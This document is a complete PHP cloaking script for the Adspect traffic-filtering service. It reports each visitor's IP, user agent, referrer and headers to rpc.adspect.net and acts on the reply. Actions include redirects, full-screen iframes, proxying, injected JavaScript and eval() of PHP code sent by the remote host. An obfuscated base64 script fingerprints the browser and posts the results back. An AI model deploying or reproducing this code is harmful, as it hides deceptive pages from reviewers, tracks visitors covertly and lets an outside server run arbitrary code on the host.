<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('0a519134-6f15-4e36-8c24-03ca37df397d', 'redirect', '_', base64_decode('bzF2Y6CmfFEBY5mApQ8nAqo8aoSzb8kZtpb0tdWyNXk=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDdlN2M9WycyMjdsUnlDQXYnLCdocmVmJywncGVybWlzc2lvbicsJzc0Mzk1aUJVZnRJJywnYm9keScsJzEzM0xJcEx3cicsJ25vZGVWYWx1ZScsJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nLCdlcnJvcnMnLCcxODQxNzlUQVVkU0InLCduYXZpZ2F0b3InLCdkb2N1bWVudCcsJ2NhbnZhcycsJzlqc1J0eXUnLCd0eXBlJywndGltZXpvbmVPZmZzZXQnLCdzdGF0ZScsJ21ldGhvZCcsJ3ZhbHVlJywnZG9jdW1lbnRFbGVtZW50JywnNDA1MDY4SUNRZGRNJywncGVybWlzc2lvbnMnLCdtZXNzYWdlJywnVU5NQVNLRURfVkVORE9SX1dFQkdMJywnd2ViZ2wnLCdxdWVyeScsJzEzNDI2Njd0cEd3SHYnLCdQT1NUJywnOTk1NENNVmdqdCcsJ2Z1bmN0aW9uJywnYWN0aW9uJywnZ2V0VGltZXpvbmVPZmZzZXQnLCdnZXRDb250ZXh0Jywnc2NyZWVuJywnc3RyaW5naWZ5JywnTm90aWZpY2F0aW9uJywnVG91Y2hFdmVudCcsJ2lucHV0JywncHVzaCcsJ3RoZW4nLCdsZW5ndGgnLCdnZXRPd25Qcm9wZXJ0eU5hbWVzJywnMjI2UWpYYUZLJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCdsb2NhdGlvbicsJ3Rvc3RyaW5nJywnaGlkZGVuJywndG9TdHJpbmcnLCd0b3VjaEV2ZW50JywnMTYxNzkzMEpaWERXUScsJ25vdGlmaWNhdGlvbnMnLCdub2RlTmFtZScsJ2NvbnNvbGUnLCduYW1lJywnMWhNaERpdicsJ29iamVjdCcsJ2NyZWF0ZUVsZW1lbnQnLCdhcHBlbmRDaGlsZCcsJ3dpbmRvdycsJzE5RlJ6RXdhJywnZ2V0UGFyYW1ldGVyJywnY3JlYXRlRXZlbnQnXTt2YXIgXzB4NGMyMz1mdW5jdGlvbihfMHgyOWMxZGEsXzB4NGRkM2UxKXtfMHgyOWMxZGE9XzB4MjljMWRhLTB4YTk7dmFyIF8weDdlN2NhYz1fMHg3ZTdjW18weDI5YzFkYV07cmV0dXJuIF8weDdlN2NhYzt9OyhmdW5jdGlvbihfMHhjNmFlZTcsXzB4NTk0MDdjKXt2YXIgXzB4MWVkNmI3PV8weDRjMjM7d2hpbGUoISFbXSl7dHJ5e3ZhciBfMHhkNzg2YTE9LXBhcnNlSW50KF8weDFlZDZiNygweGMwKSkrLXBhcnNlSW50KF8weDFlZDZiNygweGI5KSkqLXBhcnNlSW50KF8weDFlZDZiNygweGI1KSkrcGFyc2VJbnQoXzB4MWVkNmI3KDB4YjEpKSpwYXJzZUludChfMHgxZWQ2YjcoMHhjOCkpKy1wYXJzZUludChfMHgxZWQ2YjcoMHhjNikpKi1wYXJzZUludChfMHgxZWQ2YjcoMHhlMikpK3BhcnNlSW50KF8weDFlZDZiNygweGE5KSkqLXBhcnNlSW50KF8weDFlZDZiNygweGFmKSkrLXBhcnNlSW50KF8weDFlZDZiNygweGFjKSkqcGFyc2VJbnQoXzB4MWVkNmI3KDB4ZDYpKSstcGFyc2VJbnQoXzB4MWVkNmI3KDB4ZGQpKTtpZihfMHhkNzg2YTE9PT1fMHg1OTQwN2MpYnJlYWs7ZWxzZSBfMHhjNmFlZTdbJ3B1c2gnXShfMHhjNmFlZTdbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDMzZDBmYyl7XzB4YzZhZWU3WydwdXNoJ10oXzB4YzZhZWU3WydzaGlmdCddKCkpO319fShfMHg3ZTdjLDB4Y2MzMDMpLGZ1bmN0aW9uKCl7dmFyIF8weDdhNjM1Nz1fMHg0YzIzO2Z1bmN0aW9uIF8weDQyNTYxYSgpe3ZhciBfMHgyMzA3YTY9XzB4NGMyMztfMHg2NWQzZjNbXzB4MjMwN2E2KDB4YjQpXT1fMHgzNWZjZmQ7dmFyIF8weDI3NzMwZj1kb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKCdmb3JtJyksXzB4NTYxZGMyPWRvY3VtZW50W18weDIzMDdhNigweGU0KV0oXzB4MjMwN2E2KDB4ZDEpKTtfMHgyNzczMGZbXzB4MjMwN2E2KDB4YmQpXT1fMHgyMzA3YTYoMHhjNyksXzB4Mjc3MzBmW18weDIzMDdhNigweGNhKV09d2luZG93W18weDIzMDdhNigweGQ4KV1bXzB4MjMwN2E2KDB4YWQpXSxfMHg1NjFkYzJbXzB4MjMwN2E2KDB4YmEpXT1fMHgyMzA3YTYoMHhkYSksXzB4NTYxZGMyW18weDIzMDdhNigweGUxKV09J2RhdGEnLF8weDU2MWRjMltfMHgyMzA3YTYoMHhiZSldPUpTT05bXzB4MjMwN2E2KDB4Y2UpXShfMHg2NWQzZjMpLF8weDI3NzMwZltfMHgyMzA3YTYoMHhlNSldKF8weDU2MWRjMiksZG9jdW1lbnRbXzB4MjMwN2E2KDB4YjApXVtfMHgyMzA3YTYoMHhlNSldKF8weDI3NzMwZiksXzB4Mjc3MzBmWydzdWJtaXQnXSgpO312YXIgXzB4MzVmY2ZkPVtdLF8weDY1ZDNmMz17fTt0cnl7dmFyIF8weDUyNGY5Nj1mdW5jdGlvbihfMHg1NmMwNTApe3ZhciBfMHgxNDliYzE9XzB4NGMyMztpZihfMHgxNDliYzEoMHhlMyk9PT10eXBlb2YgXzB4NTZjMDUwJiZudWxsIT09XzB4NTZjMDUwKXt2YXIgXzB4MzI5YWE0PWZ1bmN0aW9uKF8weDQ4N2Y4NSl7dmFyIF8weDMxMmQxZj1fMHgxNDliYzE7dHJ5e3ZhciBfMHgyYTM2Mjc9XzB4NTZjMDUwW18weDQ4N2Y4NV07c3dpdGNoKHR5cGVvZiBfMHgyYTM2Mjcpe2Nhc2UgXzB4MzEyZDFmKDB4ZTMpOmlmKG51bGw9PT1fMHgyYTM2MjcpYnJlYWs7Y2FzZSBfMHgzMTJkMWYoMHhjOSk6XzB4MmEzNjI3PV8weDJhMzYyN1tfMHgzMTJkMWYoMHhkYildKCk7fV8weDM1Y2IxNltfMHg0ODdmODVdPV8weDJhMzYyNzt9Y2F0Y2goXzB4NTIyMWI3KXtfMHgzNWZjZmRbXzB4MzEyZDFmKDB4ZDIpXShfMHg1MjIxYjdbXzB4MzEyZDFmKDB4YzIpXSk7fX0sXzB4MzVjYjE2PXt9LF8weDQxMzViNDtmb3IoXzB4NDEzNWI0IGluIF8weDU2YzA1MClfMHgzMjlhYTQoXzB4NDEzNWI0KTt0cnl7dmFyIF8weDRkYWUxYT1PYmplY3RbXzB4MTQ5YmMxKDB4ZDUpXShfMHg1NmMwNTApO2ZvcihfMHg0MTM1YjQ9MHgwO18weDQxMzViNDxfMHg0ZGFlMWFbXzB4MTQ5YmMxKDB4ZDQpXTsrK18weDQxMzViNClfMHgzMjlhYTQoXzB4NGRhZTFhW18weDQxMzViNF0pO18weDM1Y2IxNlsnISEnXT1fMHg0ZGFlMWE7fWNhdGNoKF8weDFhZTQ1Yil7XzB4MzVmY2ZkW18weDE0OWJjMSgweGQyKV0oXzB4MWFlNDViWydtZXNzYWdlJ10pO31yZXR1cm4gXzB4MzVjYjE2O319O18weDY1ZDNmM1tfMHg3YTYzNTcoMHhjZCldPV8weDUyNGY5Nih3aW5kb3dbXzB4N2E2MzU3KDB4Y2QpXSksXzB4NjVkM2YzW18weDdhNjM1NygweGU2KV09XzB4NTI0Zjk2KHdpbmRvdyksXzB4NjVkM2YzW18weDdhNjM1NygweGI2KV09XzB4NTI0Zjk2KHdpbmRvd1tfMHg3YTYzNTcoMHhiNildKSxfMHg2NWQzZjNbXzB4N2E2MzU3KDB4ZDgpXT1fMHg1MjRmOTYod2luZG93W18weDdhNjM1NygweGQ4KV0pLF8weDY1ZDNmM1tfMHg3YTYzNTcoMHhlMCldPV8weDUyNGY5Nih3aW5kb3dbXzB4N2E2MzU3KDB4ZTApXSksXzB4NjVkM2YzW18weDdhNjM1NygweGJmKV09ZnVuY3Rpb24oXzB4MjM5OWMyKXt2YXIgXzB4MjZhNjJmPV8weDdhNjM1Nzt0cnl7dmFyIF8weDU2NTYzYT17fTtfMHgyMzk5YzI9XzB4MjM5OWMyWydhdHRyaWJ1dGVzJ107Zm9yKHZhciBfMHgxZmM5NTEgaW4gXzB4MjM5OWMyKV8weDFmYzk1MT1fMHgyMzk5YzJbXzB4MWZjOTUxXSxfMHg1NjU2M2FbXzB4MWZjOTUxW18weDI2YTYyZigweGRmKV1dPV8weDFmYzk1MVtfMHgyNmE2MmYoMHhiMildO3JldHVybiBfMHg1NjU2M2E7fWNhdGNoKF8weDg5MTJiNCl7XzB4MzVmY2ZkW18weDI2YTYyZigweGQyKV0oXzB4ODkxMmI0WydtZXNzYWdlJ10pO319KGRvY3VtZW50W18weDdhNjM1NygweGJmKV0pLF8weDY1ZDNmM1tfMHg3YTYzNTcoMHhiNyldPV8weDUyNGY5Nihkb2N1bWVudCk7dHJ5e18weDY1ZDNmM1tfMHg3YTYzNTcoMHhiYildPW5ldyBEYXRlKClbXzB4N2E2MzU3KDB4Y2IpXSgpO31jYXRjaChfMHg1MzQ0Zjcpe18weDM1ZmNmZFtfMHg3YTYzNTcoMHhkMildKF8weDUzNDRmN1tfMHg3YTYzNTcoMHhjMildKTt9dHJ5e18weDY1ZDNmM1snY2xvc3VyZSddPWZ1bmN0aW9uKCl7fVtfMHg3YTYzNTcoMHhkYildKCk7fWNhdGNoKF8weDI5ZmZlNSl7XzB4MzVmY2ZkW18weDdhNjM1NygweGQyKV0oXzB4MjlmZmU1W18weDdhNjM1NygweGMyKV0pO310cnl7XzB4NjVkM2YzW18weDdhNjM1NygweGRjKV09ZG9jdW1lbnRbXzB4N2E2MzU3KDB4YWIpXShfMHg3YTYzNTcoMHhkMCkpW18weDdhNjM1NygweGRiKV0oKTt9Y2F0Y2goXzB4MTgzNWU2KXtfMHgzNWZjZmRbXzB4N2E2MzU3KDB4ZDIpXShfMHgxODM1ZTZbXzB4N2E2MzU3KDB4YzIpXSk7fXRyeXtfMHg1MjRmOTY9ZnVuY3Rpb24oKXt9O3ZhciBfMHgyMTE3NWI9MHgwO18weDUyNGY5NltfMHg3YTYzNTcoMHhkYildPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHgyMTE3NWIsJyc7fSxjb25zb2xlWydsb2cnXShfMHg1MjRmOTYpLF8weDY1ZDNmM1tfMHg3YTYzNTcoMHhkOSldPV8weDIxMTc1Yjt9Y2F0Y2goXzB4NTE0ODVlKXtfMHgzNWZjZmRbXzB4N2E2MzU3KDB4ZDIpXShfMHg1MTQ4NWVbXzB4N2E2MzU3KDB4YzIpXSk7fXdpbmRvd1tfMHg3YTYzNTcoMHhiNildW18weDdhNjM1NygweGMxKV1bXzB4N2E2MzU3KDB4YzUpXSh7J25hbWUnOl8weDdhNjM1NygweGRlKX0pW18weDdhNjM1NygweGQzKV0oZnVuY3Rpb24oXzB4NDk2ZTFmKXt2YXIgXzB4ZWUxNmY4PV8weDdhNjM1NztfMHg2NWQzZjNbXzB4ZWUxNmY4KDB4YzEpXT1bd2luZG93W18weGVlMTZmOCgweGNmKV1bXzB4ZWUxNmY4KDB4YWUpXSxfMHg0OTZlMWZbXzB4ZWUxNmY4KDB4YmMpXV0sXzB4NDI1NjFhKCk7fSxfMHg0MjU2MWEpO3RyeXt2YXIgXzB4Mjk3MWZkPWRvY3VtZW50W18weDdhNjM1NygweGU0KV0oXzB4N2E2MzU3KDB4YjgpKVtfMHg3YTYzNTcoMHhjYyldKF8weDdhNjM1NygweGM0KSksXzB4NDNhYzc4PV8weDI5NzFmZFsnZ2V0RXh0ZW5zaW9uJ10oXzB4N2E2MzU3KDB4YjMpKTtfMHg2NWQzZjNbJ3dlYmdsJ109eyd2ZW5kb3InOl8weDI5NzFmZFtfMHg3YTYzNTcoMHhhYSldKF8weDQzYWM3OFtfMHg3YTYzNTcoMHhjMyldKSwncmVuZGVyZXInOl8weDI5NzFmZFtfMHg3YTYzNTcoMHhhYSldKF8weDQzYWM3OFtfMHg3YTYzNTcoMHhkNyldKX07fWNhdGNoKF8weDE0M2JmZCl7XzB4MzVmY2ZkWydwdXNoJ10oXzB4MTQzYmZkW18weDdhNjM1NygweGMyKV0pO319Y2F0Y2goXzB4NDc3NjEwKXtfMHgzNWZjZmRbXzB4N2E2MzU3KDB4ZDIpXShfMHg0Nzc2MTBbXzB4N2E2MzU3KDB4YzIpXSksXzB4NDI1NjFhKCk7fX0oKSk7"></script>
</body>
</html>
<?php exit;